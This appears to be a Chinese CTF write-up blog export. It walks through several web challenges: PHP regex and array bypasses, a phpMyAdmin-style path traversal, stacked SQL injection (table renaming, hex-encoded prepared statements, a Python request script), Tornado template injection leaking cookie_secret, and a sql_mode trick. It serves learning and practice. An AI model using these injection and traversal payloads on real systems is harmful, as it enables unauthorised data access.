class="literal">FALSE</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;骚年，继续努力吧啊~&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>题目都说了是数组绕过了<br>直接尝试Payload：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">15.php?ctf[]=1</span><br></pre></td></tr></table></figure></div>
<p>emmmm 没想到绕过了 那正则有什么用…</p>
<hr>
<h2 id="数字验证正则绕过"><a href="#数字验证正则绕过" class="headerlink" title="数字验证正则绕过"></a>数字验证正则绕过</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//123.206.87.240:9009/21.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag&#123;test&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;POST&quot;</span> == <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> &gt;= <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[[:graph:]]&#123;12,&#125;$/&#x27;</span>, <span class="variable">$password</span>)) <span class="comment">//preg_match — 执行一个正则表达式匹配</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">TRUE</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$reg</span> = <span class="string">&#x27;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">6</span> &gt; <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$reg</span>, <span class="variable">$password</span>, <span class="variable">$arr</span>))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$ps</span> = <span class="keyword">array</span>(<span class="string">&#x27;punct&#x27;</span>, <span class="string">&#x27;digit&#x27;</span>, <span class="string">&#x27;upper&#x27;</span>, <span class="string">&#x27;lower&#x27;</span>); <span class="comment">//[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$ps</span> <span class="keyword">as</span> <span class="variable">$pt</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[[:<span class="subst">$pt</span>:]]+/&quot;</span>, <span class="variable">$password</span>))</span><br><span class="line"><span class="variable">$c</span> += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$c</span> &lt; <span class="number">3</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">//&gt;=3，必须包含四种类型三种与三种以上</span></span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;42&quot;</span> == <span class="variable">$password</span>) <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&#x27;Wrong password&#x27;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>重点：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 满足条件</span><br><span class="line">if (0 &gt;= preg_match(&#x27;/^[[:graph:]]&#123;12,&#125;/&#x27;,password)) //preg_match — 执行一个正则表达式匹配</span><br><span class="line">//得到flag</span><br><span class="line">&#123;</span><br><span class="line">echo &#x27;flag&#x27;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>preg_match()</code>返回 <code>pattern</code> 的匹配次数。 它的值将是0次（不匹配）或1次，因为<code>preg_match()</code>在第一次匹配后，将会停止搜索。<code>preg_match_all()</code>不同于此，它会一直搜索<code>subject</code> 直到到达结尾。 如果发生错误<code>preg_match()</code>返回 FALSE</p>
<p>直接POST一个password就可以，并且小于12个字符。<br>payload: <code>POST:password=1</code></p>
<hr>
<h2 id="简单的waf"><a href="#简单的waf" class="headerlink" title="简单的waf"></a>简单的waf</h2><p>打不开</p>
]]></content>
      <categories>
        <category>做题笔记</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>ctf</tag>
        <tag>code audit</tag>
      </tags>
  </entry>
  <entry>
    <title>Buuctf day1</title>
    <url>/yakko117/2019/10/21/BuuctfDay1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h1><p>新题收录挺多的，好好做好好学</p>
<h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>后来看了下，题目原型是phpmyadmin4.8.1的任意文件包含漏洞<br>CVE-2018-12613<br>打开页面，查看源码发现 <code>source.php</code>， 然后发现 <code>hint.php</code><br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g855yqho5ij30ns02laa1.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g855yqho5ij30ns02laa1.jpg" class="lazyload"></a></p>
<p>审计 <code>source.php</code> 发现存在文件包含漏洞</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8561ybbvuj30qn0hp0tt.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8561ybbvuj30qn0hp0tt.jpg" class="lazyload"></a></p>
<hr>
<h3 id="source-php-源码"><a href="#source-php-源码" class="headerlink" title="source.php 源码"></a>source.php 源码</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>分析一下 <code>checkFile()</code>函数：</p>
<ol>
<li>首先设置了一个白名单，只包含<code>source.php</code> 和<code>hint.php</code><br>第一个if检查是否存在 <code>$page</code> 并且是否为字符串。</li>
<li>检查<code>$page</code>是否在白名单中，是的话返回true。<br>接下来，两个函数一个<code>mb_substr</code>和<code>mb_strpos</code>，当截取变量page中?前面的字符串，然后再进行白名单校验。</li>
<li>考虑了URL编码的缘故，再一次解码之后，进行校验。</li>
</ol>
<p>传递一个参数 <code>file=source.php?/../../../../../../ffffllllaaaagggg</code>，进行目录穿越，还要把?进行两次url编码，所以最后的payload<br><code>file=source.php%253f/../../../../../../ffffllllaaaagggg</code></p>
<p>第一次验证仅仅判断白名单<br>第二次截取完也过不了<br>第三次，经过url解码之后，我们构造的payload就变成了 <code>source.php?/../../../../../../ffffllllaaaagggg</code>，很显然，它是截取?前面的进行校验，<code>source.php</code>在白名单中，所以返回true，最后通过目录穿越的到 <code>ffffllllaaaagggg</code> 页面，也就是flag。</p>
<hr>
<p>##[强网杯 2019]随便注<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g855yqk04mj312a06udgd.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g855yqk04mj312a06udgd.jpg" class="lazyload"></a></p>
<p>这里首先提交 <code>1</code>，这里回显的1对应的数据<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g855yqk6moj310n0a8aaw.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g855yqk6moj310n0a8aaw.jpg" class="lazyload"></a></p>
<p>然后提交 <code>1&#39;</code>，报错了<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g855yqlno8j30ub06tt9f.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g855yqlno8j30ub06tt9f.jpg" class="lazyload"></a></p>
<p>然后尝试<code>1&#39; or &#39;&#39;=&#39;</code>， 回显正常</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g855yqlftsj31050gv75a.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g855yqlftsj31050gv75a.jpg" class="lazyload"></a><br>说明存在注入，但是这里把常见的关键字都过掉了，并且是不区分大小写的正则进行过滤，所以常规的查系统表然后注入的方法肯定不行，这里可以尝试堆叠注入。</p>
<p><a href="https://dev.mysql.com/doc/refman/5.5/en/sql-syntax-prepared-statements.html">堆叠查询</a><br><a href="https://blog.csdn.net/lqx_sunhan/article/details/79852063">利用 prepare 调用</a></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g855yqm7c3j30z406wjs2.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g855yqm7c3j30z406wjs2.jpg" class="lazyload"></a></p>
<p>尝试使用 <code>?inject=1%27;show tables;</code> 得到表名，得到两张表<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g855yqpcnhj310m0hdmy8.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g855yqpcnhj310m0hdmy8.jpg" class="lazyload"></a></p>
<p>然后 <code>show coloums from</code><br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8562xs8b2j30e501jdfn.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8562xs8b2j30e501jdfn.jpg" class="lazyload"></a></p>
<p>查看一下 <code>words</code> 表<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8562xww7kj310o0rkq4k.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8562xww7kj310o0rkq4k.jpg" class="lazyload"></a><br>可以看到存在flag </p>
<p>使用 <code>show create table xxxx;</code> 语句也可以查到表的结构。<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8562xp8xwj30zt0fjjso.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8562xp8xwj30zt0fjjso.jpg" class="lazyload"></a></p>
<p>因为后端数据库实际上是查询的words表，可以使用alter来更改表名和表字段，让1919810931114514的表更名为words表，那么查询的words的时候实际上是对19这张表的查询，</p>
<p>思路就是把 <code>1919810931114514</code> 改成 </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">words, alter table words rename xxx;alter table `1919810931114514`rename words;</span><br><span class="line"></span><br><span class="line">这里可以把 flag 列改为 id，或者单独加一个 id 列。</span><br><span class="line"></span><br><span class="line">ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;</span><br><span class="line"></span><br><span class="line">alter table `words` add(id int default 1);</span><br><span class="line"></span><br><span class="line">或者 </span><br><span class="line">&#x27;;alter table `1919810931114514` add(id int default 1);alter table words rename xxx;alter table `1919810931114514` rename words;#</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8562xwutcj313c097t9l.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8562xwutcj313c097t9l.jpg" class="lazyload"></a><br>然后就可以直接查看了<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8562xxi1hj30q50a5js0.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8562xxi1hj30q50a5js0.jpg" class="lazyload"></a><br><a href="https://altman.vip/2019/05/27/QWB2019-writeup/#%E9%9A%8F%E4%BE%BF%E6%B3%A8">参考了师傅的wp</a></p>
<h3 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h3><p>同时也看到了像这样的</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import requests</span><br><span class="line">#1919810931114514</span><br><span class="line">part_url=&#x27;http://localhost:8080/?inject=&#x27;</span><br><span class="line">payload=&quot;select flag from `1919810931114514`;&quot;</span><br><span class="line">payload=payload.encode(&#x27;hex&#x27;)</span><br><span class="line">payload=&#x27;&#x27;&#x27;1&#x27;;Set @x=0x&#x27;&#x27;&#x27;+str(payload)+&#x27;&#x27;&#x27;;Prepare a from @x;execute a;%23&#x27;&#x27;&#x27;</span><br><span class="line">print payload</span><br><span class="line">full_url=part_url+payload</span><br><span class="line">r=requests.get(url=full_url)</span><br><span class="line">print r.content</span><br></pre></td></tr></table></figure></div>
<p>先编译sql语句，这里将payload进行了16进制编码，然后使用execute来进行执行，这里16进制编码的payload在编译中可以识别出来的，又学到了。</p>
]]></content>
      <categories>
        <category>做题笔记</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTFDay2</title>
    <url>/yakko117/2019/11/10/BuuctfDay2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h1><h2 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h2><p>主要考点是：<strong>SSTi模板注入</strong><br>一些参考文献如下：<br><a href="https://www.freebuf.com/vuls/83999.html">SSTI模板注入浅谈</a><br><a href="http://ch.vksec.com/2017/06/tornado.html">Tornado模板注入</a><br><a href="https://tornado.readthedocs.io/en/stable/">官方手册</a><br><a href="https://www.cnblogs.com/cimuhuashuimu/p/11544455.html">大佬的思路</a></p>
<hr>
<p>打开题目<br><a href="https://wx3.sinaimg.cn/large/0077TIyQgy1g8nh0lfc57j307303ga9w.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://wx3.sinaimg.cn/large/0077TIyQgy1g8nh0lfc57j307303ga9w.jpg" class="lazyload"></a></p>
<p>点开每个链接的内容和URL格式如下</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/flag.txt</span><br><span class="line">flag in /fllllllllllllag</span><br><span class="line"></span><br><span class="line">/welcome.txt</span><br><span class="line">render</span><br><span class="line"></span><br><span class="line">/hints.txt</span><br><span class="line">md5(cookie_secret+md5(filename))</span><br><span class="line"></span><br><span class="line">http://localhost/file?filename=/hints.txt&amp;filehash=8fd6c75084d062081fb182f4d18d938c</span><br></pre></td></tr></table></figure></div>

<p>现在<code>filename=/fllllllllllllag</code>，只需要知道<code>cookie_secret</code>既能访问<code>flag</code>。<br>根据提示flag所在文件夹，加上路径去访问<br>发现无法访问，被跳转到一个错误页面<br>格式为 <code>/error?msg=Error</code> 开始判断是个模板注入</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8nh0krwt0j30t105r0su.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8nh0krwt0j30t105r0su.jpg" class="lazyload"></a></p>
<hr>
<p>翻了一下<a href="https://tornado.readthedocs.io/en/latest/guide/templates.html">手册</a>发现一些可以输入的函数</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8nh0krojnj30vy0ictc9.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8nh0krojnj30vy0ictc9.jpg" class="lazyload"></a></p>
<p>找到个 <code>datetime</code><br>在Tornado的前端页面模板中，<code>datetime</code>是指向<code>python</code>中<code>datetime</code>这个模块<br>尝试注入， 回显如下</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/error?msg=&#123;&#123;datetime&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8nh0kob15j313405at98.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8nh0kob15j313405at98.jpg" class="lazyload"></a></p>
<hr>
<p>通过查阅文档发现<code>cookie_secret</code>在<code>Application</code>对象settings属性中，还发现self.application.settings&#96;有一个<a href="https://tornado.readthedocs.io/en/latest/web.html#tornado.web.RequestHandler.settings">别名</a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RequestHandler.settings</span><br><span class="line">An alias for self.application.settings.</span><br></pre></td></tr></table></figure></div>
<p><code>handler</code>指向的处理当前这个页面的 <code>RequestHandler</code>对象，<br><code>RequestHandler.settings</code> 指向 <code>self.application.settings</code>，<br>因此 <code>handler.settings</code> 指向 <code>RequestHandler.application.settings</code>。</p>
<p>构造payload获取 <code>cookie_secret</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p><a href="https://wx2.sinaimg.cn/large/0077TIyQgy1g8nh0kod92j31az04wjs0.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://wx2.sinaimg.cn/large/0077TIyQgy1g8nh0kod92j31az04wjs0.jpg" class="lazyload"></a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;cookie_secret&#x27;: &#x27;4099719d-a30b-4e20-a2b1-2186e5d29ee4&#x27;</span><br></pre></td></tr></table></figure></div>

<p>计算filehash值(用py2.x版本)</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">s</span>):</span><br><span class="line"> md5 = hashlib.md5() </span><br><span class="line"> md5.update(s) </span><br><span class="line"> <span class="keyword">return</span> md5.hexdigest()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filehash</span>():</span><br><span class="line"> filename = <span class="string">&#x27;/fllllllllllllag&#x27;</span></span><br><span class="line"> cookie_secret = <span class="string">&#x27;4099719d-a30b-4e20-a2b1-2186e5d29ee4&#x27;</span></span><br><span class="line"> <span class="built_in">print</span>(md5(cookie_secret+md5(filename)))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> filehash()</span><br></pre></td></tr></table></figure></div>

<p>得到filehash如下</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a84914638153ac0968136ee5d5f19152</span><br><span class="line"></span><br><span class="line">提交payload如下：</span><br><span class="line">file?filename=/fllllllllllllag&amp;filehash=a84914638153ac0968136ee5d5f19152</span><br><span class="line"></span><br><span class="line">得到flag</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>参考文献<br><a href="https://www.cnblogs.com/fireporsche/p/8618691.html">MySQL的sql_mode解析与设置</a></p>
<p>进入页面后，提示要求输入正确的Flag即可获得flag，存在堆叠注入如下，但是过滤了flag。</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8nh0kom5xj30hy046aa1.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8nh0kom5xj30hy046aa1.jpg" class="lazyload"></a></p>
<p>进行堆叠查询，<code>1; show tables #</code>，回显如下</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8nh0ksjt6j30ii04574d.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8nh0ksjt6j30ii04574d.jpg" class="lazyload"></a></p>
<p>根据回显猜测查询语句为：<code>.. POST[&#39;query&#39;]||flag ...</code></p>
<h3 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h3><p>构造payload：<code>*,1</code>，这样拼接后得到：<code>select *,1||flag from Flag</code> ，即可以查出当前表中全部内容。</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8nh0ksuuuj30lp041glr.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8nh0ksuuuj30lp041glr.jpg" class="lazyload"></a></p>
<h3 id="预期解法"><a href="#预期解法" class="headerlink" title="预期解法"></a>预期解法</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PIPES_AS_CONCAT：</span><br><span class="line">将&quot;||&quot;视为字符串的连接操作符而非或运算符</span><br></pre></td></tr></table></figure></div>

<p>所以payload为：<code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code><br>这样输出的flag会与1进行拼接，得到：</p>
